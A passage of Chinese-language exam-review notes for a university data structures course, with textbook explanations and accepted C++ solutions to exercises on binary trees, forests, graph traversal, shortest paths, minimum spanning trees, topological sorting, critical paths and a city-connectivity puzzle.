tree);\n\t\tif (ls == -1)ans += '#';\n\t\tint rs = Preorder(id << 1 | 1, ans, tree);\n\t\tif (rs == -1)ans += '#';\n\t}\n\treturn 1;\n}\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring tree1, tree2, ans;\n\t\tcin >> tree1 >> tree2;\n\n\t\tPreorder(1, ans, tree1);\n\t\tif (ans == tree2)cout << \"YES\\n\";\n\t\telse cout << \"NO\\n\";\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 树结构转换（先序转双亲）\n\n##### 树的存储结构\n\n* 双亲表示法\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201140908673.png\" alt=\"image-20230201140908673\" style=\"zoom:50%;\" />\n\n* 孩子表示法\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201140940682.png\" alt=\"image-20230201140940682\" style=\"zoom: 25%;\" />\n\n* 孩子兄弟表示法\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201141027842.png\" alt=\"image-20230201141027842\" style=\"zoom: 50%;\" />\n\n  \n\n题目:\n\n```\n给出一棵二叉树的特定字符先序遍历结果（空子树用字符'#'表示），构建该二叉树，并输出该二叉树的双亲表示法结果\n双亲表示法的数组下标从0开始，根结点必定是在下标0元素，且根结点的双亲下标为-1，左右孩子按下标递增顺序排列,\n结点下标是层次遍历顺序。\n\n输入\n第一个输入t，表示有t棵二叉树\n接着t行，每行输入含特定字符的二叉树先序遍历序列\n\n输出\n共输出2t行\n每棵二叉树输出两行，第一行输出各个结点的数值，第二行输出各结点的双亲下标\n```\n\n样例：\n\n```\n3\nAB#C##D##\nABD##E##C##\nAB##CDW###E#F##\n```\n\n样例输出：\n\n```\nA B D C\n-1 0 0 1\nA B C D E\n-1 0 0 1 1\nA B C D E W F\n-1 0 0 2 2 3 4\n```\n\nAC代码：\n\n```cpp\n#include <iostream>\n#include <string>\n#include<queue>\n#include<vector>\nusing namespace std;\n\nstruct node\n{\n\tint id;\n\tchar data;\n};\n\nclass BiTreeNode {\npublic:\n\tchar  data;\t\n\tint id;\n\tBiTreeNode* leftChild, * rightChild, * parents;\n\tBiTreeNode() :leftChild(NULL), rightChild(NULL) {}\n\t~BiTreeNode() {}\n};\n\nclass BiTree {\nprivate:\n\tBiTreeNode* root;\t\n\tstring sTree;\t\t\n\tint pos;\t\t\t\n\tvector<node>parents;\n\tBiTreeNode* CreateTree();\n\tvoid levelorder(BiTreeNode* root);\npublic:\n\tBiTree() :root(NULL) {};\n\tvoid Create(string vArray);\t\n\tvoid levelorder();\n\tvoid print();\n};\n\nvoid BiTree::Create(string vArray)\n{\n\tpos = 0;\n\tsTree.assign(vArray);\t\n\troot = CreateTree();\t\n}\n\nBiTreeNode* BiTree::CreateTree()\n{\n\tBiTreeNode *t = new BiTreeNode();\n\tif (pos >= sTree.size())return\tNULL;\n\tif (sTree[pos] != '#')\n\t{\n\t\tt->data = sTree[pos++];\n\t\tt->leftChild = CreateTree();\n\t\tt->rightChild = CreateTree();\n\t}\n\telse pos++, t = NULL;\n\treturn t;\n}\n\nvoid BiTree::levelorder()\n{\n\tlevelorder(root);\n}\n\nvoid BiTree::levelorder(BiTreeNode* root)\n{\n\tif (!root)return;\n\tqueue<BiTreeNode*>q;\n\tq.push(root);\n\troot->id = 0;\n\tint id = 0;\n\tparents.push_back({ -1,root->data });\n\twhile (!q.empty())\n\t{\n\t\tBiTreeNode* f = q.front();\n\t\tif (f->leftChild)\n\t\t{\n\t\t\tq.push(f->leftChild);\n\t\t\tparents.push_back({ f->id,f->leftChild->data });\n\t\t\tf->leftChild->id = ++id;\n\t\t}\n\t\tif (f->rightChild)\n\t\t{\n\t\t\tq.push(f->rightChild);\n\t\t\tparents.push_back({ f->id,f->rightChild->data });\n\t\t\tf->rightChild->id = ++id;\n\t\t}\n\t\tq.pop();\n\t}\n}\n\nvoid BiTree::print()\n{\n\tint size = parents.size();\n\tif (!size)cout << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tif (i == size - 1)cout << parents[i].data << endl;\n\t\telse cout << parents[i].data << ' ';\n\t}\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tif (i == size - 1)cout << parents[i].id << endl;\n\t\telse cout << parents[i].id << ' ';\n\t}\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBiTree bt;\n\t\tbt.Create(tree);\n\t\tbt.levelorder();\n\t\tbt.print();\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 先序+中序还原二叉树\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123420019.png\" alt=\"image-20230201123420019\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123434082.png\" alt=\"image-20230201123434082\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123446919.png\" alt=\"image-20230201123446919\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123501500.png\" alt=\"image-20230201123501500\" style=\"zoom:50%;\" />\n\n\n\n题目:\n\n```\n给定一棵二叉树的先序遍历序列和中序遍历序列，要求计算该二叉树的高度。\n\n输入\n输入首先给出正整数N（≤50），为树中结点总数。下面两行先后给出先序和中序遍历序列，均是长度为N的不包含重复英文字母（区别大小写）的字符串。\n\n输出\n输出为一个整数，即该二叉树的高度。\n```\n\n样例：\n\n```\n9\nABDFGHIEC\nFDHGIBEAC\n```\n\n样例输出：\n\n```\n5\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\n\nstruct BITnode\n{\n\tBITnode* lchild = nullptr, *rchild = nullptr;\n\tchar data;\n};\nint n, maxdep = 0;\nchar* pre;\nchar *mid;\n\nBITnode* buildtree(char* pre, char* mid, int len)\n{\n\tif (len == 0)return nullptr;\n\tint l = find(mid, mid + len, pre[0]) - mid;\n\tauto t = new BITnode;\n\tt->data = pre[0];\n\tt->lchild = buildtree(pre+1, mid, l);\n\tt->rchild = buildtree(pre+1+l, mid+1+l, len - 1 - l);\n\treturn t;\n}\n\nint caldep(BITnode* pos, int dep)\n{\n\tif (pos == nullptr)return -1;\n\tint ls = caldep(pos->lchild, dep + 1);\n\tint rs = caldep(pos->rchild, dep + 1);\n\tif (ls == -1 && rs == -1)\n\t{\n\t\tmaxdep = max(maxdep, dep + 1);\n\t}\n\treturn 0;\n}\n\nint main()\n{\n\tcin >> n;\n\tpre = new char[n];\n\tmid = new char[n];\n\tfor (int i = 0; i < n; i++)cin >> pre[i];\n\tfor (int i = 0; i < n; i++)cin >> mid[i];\n\tBITnode* root = buildtree(pre, mid, n);\n\tcaldep(root, 0);\n\tcout << maxdep << endl;\n\treturn 0;\n}\n```\n\n\n\n#### 线索二叉树（线索的概念）\n\n**指向结点前驱和后继的指针，叫做线索。**\n\n加上线索的二叉树称为线索二叉树(Threaded Binary Tree)。\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201123639487.png\" alt=\"image-20230201123639487\" style=\"zoom:50%;\" />\n\n\n\n#### 森林叶子编码\n\n题目:\n\n```\n给定一组森林，编写程序生成对应的二叉树，输出这颗二叉树叶结点对应的二进制编码.规定二叉树的左边由0表示，二叉树的右边由1表示。\n\n输入：\nN B  表示N个树，每结点最多B个分支\n第2行至第N+1行，每个树的先序遍历\n\n输出\n每行表示一个叶结点对应的二进制编码.\n```\n\n样例：\n\n```\n3 3\nA B 0 0 0 C 0 0 0 D 0 0 0\nE F 0 0 0 0 0\nG H 0 0 0 I J 0 0 0 0 0 0\n```\n\n样例输出：\n\n```\n0 1 1\n1 0\n1 1 0 1 0\n```\n\nAC代码：\n\n```cpp\n#include <iostream>\nusing namespace std;\n\nstruct BiTreeNode\n{\n\tchar data;\n\tBiTreeNode* lchild, * rchild;\n\tBiTreeNode(char e) :data(e), lchild(nullptr), rchild(nullptr) {}\n};\n\nclass BiTree\n{\n\tBiTreeNode* root;\n\tBiTreeNode* createbitree(int k)\n\t{\n\t\tchar node;\n\t\tBiTreeNode* t = nullptr, * child[30], * p;\n\n\t\tcin >> node;\n\t\tif (node != '0')\n\t\t{\n\t\t\tt = new BiTreeNode(node);\n\t\t\tfor (int i = 0; i < k; i++)\n\t\t\t{\n\t\t\t\tchild[i] = createbitree(k);\n\t\t\t\tif (child[i] && !t->lchild)\n\t\t\t\t\tt->lchild = child[i];\n\t\t\t\telse if (child[i])\n\t\t\t\t{\n\t\t\t\t\tp = t->lchild;\n\t\t\t\t\twhile (p->rchild)\n\t\t\t\t\t{\n\t\t\t\t\t\tp = p->rchild;\n\t\t\t\t\t}\n\t\t\t\t\tp->rchild = child[i];\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn t;\n\t}\n\n\tvoid encode(BiTreeNode* t, string code)\n\t{\n\t\tint i;\n\t\tif (t)\n\t\t{\n\t\t\tif (!t->lchild && !t->rchild)\n\t\t\t{\n\t\t\t\tfor (i = 0; i < (int)code.size() - 1; i++)\n\t\t\t\t\tcout << code[i] << \" \";\n\t\t\t\tcout << code[i] << endl;\n\t\t\t}\n\t\t\tif (t->lchild)\n\t\t\t\tencode(t->lchild, code + \"0\");\n\t\t\tif (t->rchild)\n\t\t\t\tencode(t->rchild, code + \"1\");\n\t\t}\n\t}\n\n\npublic:\n\tBiTree():root(nullptr){}\n\tvoid createtree(int n, int k)\n\t{\n\t\tBiTreeNode* tree[30], * p;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\ttree[i] = createbitree(k);\n\t\t\tif (tree[i] && !root)\n\t\t\t\troot = tree[i];\n\t\t\telse if (tree[i])\n\t\t\t{\n\t\t\t\tp = root;\n\t\t\t\twhile (p->rchild)\n\t\t\t\t\tp = p->rchild;\n\t\t\t\tp->rchild = tree[i];\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid encode()\n\t{\n\t\tencode(root, \"\");\n\t}\n};\n\nint main()\n{\n\tint n, k;\n\n\tcin >> n >> k;\n\n\tBiTree forest;\n\tforest.createtree(n,k);\n\tforest.encode();\n}\n```\n\n\n\n\n\n## 图\n\n无向图：圆括号\n\n有向图：尖括号\n\n\n\n##### 邻接矩阵\n\n性质：\n\n* 无向图的邻接矩阵是对称的\n\n* 其第i行1的个数或第i列1的个数，等于顶点i的度TD(i)\n\n* 有向图的邻接矩阵可能是不对称的\n\n* 其第i行1的个数等于顶点i的出度OD(i)，第j列1的个数等于顶点j的入度ID(j)\n\n\n\n##### 邻接表\n\n性质：\n\n* 对于有向图的邻接表，其第i个链表中结点的个数只是该顶点的出度；如果要计算入度，必须遍历整个邻接表 [也可以建立一个逆邻接表]。\n\n* 要判定两个顶点i和j是否有边（或弧），必须搜索整个第i个和第j个链表，不及邻接矩阵方便。\n\n\n\n#### 图综合练习--构建邻接表\n\n题目:\n\n```\n已知一有向图，构建该图对应的邻接表。\n邻接表包含数组和单链表两种数据结构，其中每个数组元素也是单链表的头结点，数组元素包含两个属性，属性一是顶点编号info，属性二是指针域next指向与它相连的顶点信息。\n单链表的每个结点也包含两个属性，属性一是顶点在数组的位置下标，属性二是指针域next指向下一个结点。\n\n输入\n第1行输入整数t，表示有t个图\n第2行输入n和k，表示该图有n个顶点和k条弧。\n第3行输入n个顶点。\n第4行起输入k条弧的起点和终点，连续输入k行\n以此类推输入下一个图\n\n输出\n输出每个图的邻接表，每行输出格式：数组下标 顶点编号-连接顶点下标-......-^，数组下标从0开始。\n具体格式请参考样例数据，每行最后加入“^”表示NULL。\n```\n\n样例：\n\n```\n1\n5 7\nA B C D E\nA B\nA D\nA E\nB D\nC B\nC E\nE D\n```\n\n样例输出：\n\n```\n0 A-1-3-4-^\n1 B-3-^\n2 C-1-4-^\n3 D-^\n4 E-3-^\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<map>\nusing namespace std;\n\nvector<int> g[10000];\nchar node[10000];\nmap<char, int> m;\n\nvoid print(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << i << ' ' << node[i];\n\t\tfor (int j = 0; j < g[i].size(); j++)\n\t\t{\n\t\t\tcout << '-' << m[node[g[i][j]]];\n\t\t}\n\t\tcout << \"-^\\n\";\n\t}\n}\n\nint main()\n{\n\tint t, n, k;\n\tchar c;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n >> k;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> c;\n\t\t\tm[c] = i;\n\t\t\tnode[i] = c;\n\t\t}\n\t\tchar from, to;\n\t\tfor (int i = 0; i < k; i++)\n\t\t{\n\t\t\tcin >> from >> to;\n\t\t\tg[m[from]].push_back(m[to]);\n\t\t}\n\t\tprint(n);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS图遍历--深度优先搜索\n\n题目:\n\n```\n给出一个图的邻接矩阵，对图进行深度优先搜索，从顶点0开始\n以下代码框架仅供参考，同学们可在理解的基础上自行设计算法，不强制要求和框架相同\n注意：图n个顶点编号从0到n-1\n代码框架如下：\n*用类写的图框架狗都不用（\n\n输入\n第一行输入t，表示有t个测试实例\n第二行输入n，表示第1个图有n个结点\n第三行起，每行输入邻接矩阵的一行，以此类推输入n行\n第i个结点与其他结点如果相连则为1，无连接则为0，数据之间用空格隔开\n以此类推输入下一个示例\n\n输出\n每行输出一个图的深度优先搜索结果，结点编号之间用空格隔开\n```\n\n样例：\n\n```\n2\n4\n0 0 1 1\n0 0 1 1\n1 1 0 1\n1 1 1 0\n5\n0 0 0 1 1\n0 0 1 0 0\n0 1 0 1 1\n1 0 1 0 0\n1 0 1 0 0\n```\n\n样例输出：\n\n```\n0 2 1 3 \n0 3 2 1 4 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<cstring>\nusing namespace std;\n\n#define maxn 1000\n\nint g[maxn][maxn];\nbool vis[maxn];\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(vis, 0, sizeof vis);\n}\n\nvoid dfs(int n, int pos)\n{\n\tif (vis[pos])return;\n\tvis[pos] = 1;\n\tcout << pos << ' ';\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (g[pos][i])dfs(n, i);\n\t}\n}\n\nint main()\n{\n\tint t, n;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < n; i++)dfs(n, i);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS图遍历--广度优先搜索\n\n题目和上一题一样\n\n样例：\n\n```\n2\n4\n0 0 1 1\n0 0 1 1\n1 1 0 1\n1 1 1 0\n5\n0 0 0 1 1\n0 0 1 0 0\n0 1 0 1 1\n1 0 1 0 0\n1 0 1 0 0\n```\n\n样例输出：\n\n```\n0 2 3 1 \n0 3 4 2 1 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<cstring>\n#include<queue>\nusing namespace std;\n\n#define maxn 1000\n\nint g[maxn][maxn];\nbool vis[maxn];\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(vis, 0, sizeof vis);\n}\n\nvoid bfs(int n, int pos)\n{\n\tif (vis[pos])return;\n\tqueue<int>q;\n\tvis[pos] = 1;\n\tq.push(pos);\n\twhile (!q.empty())\n\t{\n\t\tint f = q.front();\n\t\tcout << f << ' ';\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (!vis[i] && g[f][i] == 1)q.push(i), vis[i] = 1;\n\t\t}\n\t\tq.pop();\n\t}\n}\n\nint main()\n{\n\tint t, n;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < n; i++)bfs(n, i);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n##### 图的遍历的时间复杂度\n\n* 无论是深度优先遍历还是广度优先遍历,其实质都是透过边或弧找邻接点的过程,只是访问的顺序不同。\n\n* 两者的时间复杂度相同\n\n* 取决于采取的存储结构，若用邻接矩阵为O(n2),  若用邻接表则为O(n+e) 。\n\n\n\n#### E. DS图—图非0面积\n\n题目:\n\n```\n编程计算由\"1\"围成的下列图形的面积。面积计算方法是统计\"1\"所围成的闭合曲线中\"0\"点的数目。如图所示，在10*10的二维数组中，\"1\"围住了15个点，因此面积为15。\n```\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230130105830956.png\" alt=\"image-20230130105830956\" style=\"zoom:50%;\" />\n\n```\n提示：queue\n\n输入\n测试次数t\n每组测试数据格式为：\n数组大小m,n\n一个由0和1组成的m*n的二维数组\n\n输出\n对每个二维数组，输出符号\"1\"围住的\"0\"的个数，即围成的面积。假设一定有1组成的闭合曲线，但不唯一。\n```\n\n样例：\n\n```\n2\n10 10\n0 0 0 0 0 0 0 0 0 0\n0 0 0 0 1 1 1 0 0 0\n0 0 0 0 1 0 0 1 0 0\n0 0 0 0 0 1 0 0 1 0\n0 0 1 0 0 0 1 0 1 0\n0 1 0 1 0 1 0 0 1 0\n0 1 0 0 1 1 0 1 1 0\n0 0 1 0 0 0 0 1 0 0\n0 0 0 1 1 1 1 1 0 0\n0 0 0 0 0 0 0 0 0 0\n5 8\n0 1 1 0 0 1 1 0\n1 0 1 0 1 0 0 1\n0 1 0 1 0 0 1 0\n0 1 0 0 1 1 1 0\n0 0 0 0 0 0 0 0\n```\n\n样例输出：\n\n```\n15\n5\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\n#include<cstring>\nusing namespace std;\n\n#define maxn 1000\n\nint g[maxn][maxn];\nbool vis[maxn][maxn];\n\nint step[4][2] = { {1,0},{-1,0},{0,1},{0,-1} };\nstruct node\n{\n\tint x, y;\n};\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(vis, 0, sizeof vis);\n}\n\nvoid bfs(int n, int m, int stx, int sty)\n{\n\tvis[stx][sty] = 1;\n\tif (g[stx][sty] == 1)return;\n\tg[stx][sty] = 1;\n\tqueue<node>q;\n\tq.push({ stx,sty });\n\twhile (!q.empty())\n\t{\n\t\tnode f = q.front();\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tint xx = f.x + step[i][0], yy = f.y + step[i][1];\n\t\t\tif (!vis[xx][yy] && xx >= 0 && xx < n && yy >= 0 && yy < m && g[xx][yy] == 0)\n\t\t\t{\n\t\t\t\tvis[xx][yy] = 1;\n\t\t\t\tq.push({ xx,yy });\n\t\t\t\tg[xx][yy] = 1;\n\t\t\t}\n\t\t}\n\t\tq.pop();\n\t}\n\t\n}\n\nint main()\n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n >> m;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < m; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tbfs(n, m, i, 0);\n\t\t\tbfs(n, m, n - 1, i);\n\t\t\tbfs(n, m, 0, i);\n\t\t\tbfs(n, m, 0, m - 1);\n\t\t}//4次bfs是为了处理某些特殊情况\n\t\tint cnt = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < m; j++)\n\t\t\t{\n\t\t\t\tif (!g[i][j])cnt++;\n\t\t\t}\n\t\t}\n\t\tcout << cnt << endl;\n\t}\n\treturn 0;\n}\n```\n\n也可以先用一圈0将原图形围起来之后再bfs，这样就只用一次bfs就能解决\n\n\n\n#### 最小生成树算法\n\n##### Prim\n\n算法描述：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202110836894.png\" alt=\"image-20230202110836894\" style=\"zoom:50%;\" />\n\n\n\n过程实现：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202110857601.png\" alt=\"image-20230202110857601\" style=\"zoom:50%;\" />\n\n\n\n表格形式：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202111026516.png\" alt=\"image-20230202111026516\" style=\"zoom:50%;\" />\n\n\n\n##### Kruskal\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202111100717.png\" alt=\"image-20230202111100717\" style=\"zoom:50%;\" />\n\n过程实现：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202111117291.png\" alt=\"image-20230202111117291\" style=\"zoom:50%;\" />\n\n\n\n##### 两种算法的比较\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202111223070.png\" alt=\"image-20230202111223070\" style=\"zoom:50%;\" />\n\n\n\n#### 最短路径算法\n\n* 与最小生成树的区别：\n\n  1.最短路径的操作对象主要是有向图(网)，而最小生成树的操作对象是无向图。\n\n  2.最短路径有一个始点，最小生成树没有\n\n  3.最短路径关心的是始点到每个顶点的路径最短，而 最小生成树关心的是整个树的代价最小\n\n##### Dijkstra\n\n算法描述：\n\n```\n设置两个顶点的集合U和T，集合U中存放已找到最短路径的顶点，集合T中存放当前还未找到最短路径的顶点。\n初始状态时，集合U中只包含源点，设为v0；\n然后从集合T中选择到源点v0路径长度最短的顶点u加入到集合U中；\n集合U中每加入一个新的顶点u都要修改源点v0到集合T中剩余顶点的当前最短路径长度值，集合T中各顶点的新的当前最短路径长度值，为原来的当前最短路径长度值与从源点过顶点u到达该顶点的路径长度中的较小者。\n转到3，此过程不断重复，直到集合T中的顶点全部加入到集合U中为止。 \n```\n\n例子：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202120624978.png\" alt=\"image-20230202120624978\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202120639382.png\" alt=\"image-20230202120639382\" style=\"zoom: 33%;\" />\n\n* 与prim的对比\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230202120751505.png\" alt=\"image-20230202120751505\" style=\"zoom: 50%;\" />\n\n  ###### 时间复杂度分析\n\n  顶点数n,边数e,邻接矩阵存储。\n  初始化：O(n)\n  循环最多n-1次\n  选最小：O(n)\n  更新：O(n)\n  故时间复杂度为$O(n^2)$。  \n\n  \n\n##### Floyd\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121001326.png\" alt=\"image-20230202121001326\" style=\"zoom:50%;\" />\n\n例子演示：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121047397.png\" alt=\"image-20230202121047397\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121100794.png\" alt=\"image-20230202121100794\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121110911.png\" alt=\"image-20230202121110911\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121130048.png\" alt=\"image-20230202121130048\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121145035.png\" alt=\"image-20230202121145035\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121155748.png\" alt=\"image-20230202121155748\" style=\"zoom:50%;\" />\n\n主要代码：\n\n```cpp\nfor(k=0; k<n; k++) //通过k点\n\tfor(i=0; i<n; i++)\n\t \tfor(j=0; j<n; j++)\n          \tif(D[i][j] > D[i][k]+D[k][j])\n          \t{\n               D[i][j] = D[i][k]+D[k][j];\n               path[i][j] = path[i][k]+path[k][j];\n            }\n```\n\n\n\n###### 时间复杂度分析\n\n顶点数n,边数e,邻接矩阵存储。\n\n经过k点，循环n次\n\n对矩阵中每个点计算，$O(n^2)$\n\n故时间复杂度为$O(n^3)$。\n\n\n\n#### 拓扑排序\n\n由严格偏序定义得到的拓扑有序的操作称拓扑排序\n\n算法：\n\n```\n（1）在有向图中选一个没有前驱的顶点且输出之\n（2）从图中删除该顶点和所有以它为尾的弧\n重复（1）（2）两步，直到所有顶点输出为止或跳出循环。\n```\n\n* 拓扑排序结束后，若得到的序列中点的数量小于图的节点数，则说明存在环\n* 拓扑排序的结果不唯一\n\n例子：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202121658041.png\" alt=\"image-20230202121658041\" style=\"zoom:50%;\" />\n\n代码实现：使用栈或队列保存去掉的点\n\n\n\n#### 关键路径\n\n* 工程问题的AOE网中，从工程开始(顶点)到工程结束(顶点)之间路径长度最长的路径叫关键路径\n\n* 提前完成关键路径上的活动，工程进度会加快\n\n* 提前完成非关键路径上的活动，对工程无帮助\n* 关键活动\n  * 关键路径上的所有活动称为关键活动\n  * 找到工程AOE中的所有关键活动，即找到了关键路径。\n\n\n\nAOE网中，点表示事件，边表示活动\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122026671.png\" alt=\"image-20230202122026671\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122042729.png\" alt=\"image-20230202122042729\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122146664.png\" alt=\"image-20230202122146664\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122157381.png\" alt=\"image-20230202122157381\" style=\"zoom:50%;\" />\n\n计算关键路径：\n\n1、对AOE网进行拓扑排序得到拓扑序列\n\n2、按照拓扑序列计算事件最早开始时间ve，ve计算用max\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122229104.png\" alt=\"image-20230202122229104\" style=\"zoom:50%;\" />\n\n3、按拓扑逆序计算事件最晚开始时间vl，vl计算用min\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122330324.png\" alt=\"image-20230202122330324\" style=\"zoom:50%;\" />\n\n4、计算各活动的最早和最晚开始时间\n\n最早开始时间为事件最早开始时间，最晚开始时间为下一事件最晚开始时间减去对应的边权\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122412330.png\" alt=\"image-20230202122412330\" style=\"zoom:50%;\" />\n\n5、计算关键路径\n\nl-e为0则说明活动为关键活动，关键活动连成的路径则是关键路径\n\n根据关键活动的分布情况，关键路径不唯一\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202122600932.png\" alt=\"image-20230202122600932\" style=\"zoom:50%;\" />\n\n\n\n#### 红色警报\n\n题目:\n\n```\n战争中保持各个城市间的连通性非常重要。本题要求你编写一个报警程序，当失去一个城市导致国家被分裂为多个无法连通的区域时，就发出红色警报。注意：若该国本来就不完全连通，是分裂的k个区域，而失去一个城市并不改变其他城市之间的连通性，则不要发出警报。\n\n输入\n输入在第一行给出两个整数N（0 < N ≤ 500）和M（≤ 5000），分别为城市个数（于是默认城市从0到N-1编号）和连接两城市的通路条数。随后M行，每行给出一条通路所连接的两个城市的编号，其间以1个空格分隔。在城市信息之后给出被攻占的信息，即一个正整数K和随后的K个被攻占的城市的编号。\n注意：输入保证给出的被攻占的城市编号都是合法的且无重复，但并不保证给出的通路没有重复。\n\n输出\n对每个被攻占的城市，如果它会改变整个国家的连通性，则输出Red Alert: City k is lost!，其中k是该城市的编号；否则只输出City k is lost.即可。如果该国失去了最后一个城市，则增加一行输出Game Over.。\n```\n\n样例：\n\n```\n5 4\n0 1\n1 3\n3 0\n0 4\n5\n1 2 0 4 3\n```\n\n样例输出：\n\n```\nCity 1 is lost.\nCity 2 is lost.\nRed Alert: City 0 is lost!\nCity 4 is lost.\nCity 3 is lost.\nGame Over.\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\n#include<cstring>\nusing namespace std;\n\n#define maxn 501\n#define maxm 5001\n\nint g[maxn][maxm];\nbool vis[maxn], delp[maxn];\n\nvoid dfs(int pos, int n)\n{\n\tif (vis[pos])return;\n\tvis[pos] = 1;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (!vis[i] && g[pos][i])dfs(i, n);\n\t}\n}\n\nvoid delpoint(int n, int pos)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tg[pos][i] = g[i][pos] = 0;\n\t}\n}\n\nint calparts(int n)\n{\n\tmemset(vis, 0, sizeof vis);\n\tint ans = 0;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (!vis[i] && !delp[i])\n\t\t{\n\t\t\tdfs(i, n), ans++;\n\t\t}\n\t}\n\treturn ans;\n}\n\nvoid attack(int k)\n{\n\tint parts = calparts(k);\n\tfor (int i = 0; i < k; i++)\n\t{\n\t\tint pos;\n\t\tcin >> pos;\n\t\tdelpoint(k, pos);\n\t\tdelp[pos] = 1;\n\t\tint parts2 = calparts(k);\n\t\tif (parts2 > parts)cout << \"Red Alert: City \" << pos << \" is lost!\\n\";\n\t\telse cout << \"City \" << pos << \" is lost.\\n\";\n\t\tparts = parts2;\n\t\tif (i == k - 1)cout << \"Game Over.\";\n\t}\n}\n\nint main()\n{\n\tint n, m;\n\tcin >> n >> m;\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint from, to;\n\t\tcin >> from >> to;\n\t\tg[from][to] = g[to][from] = 1;\n\t}\n\tint k;\n\tcin >> k;\n\tattack(k);\n\treturn 0;\n}\n```\n\n\n\n#### 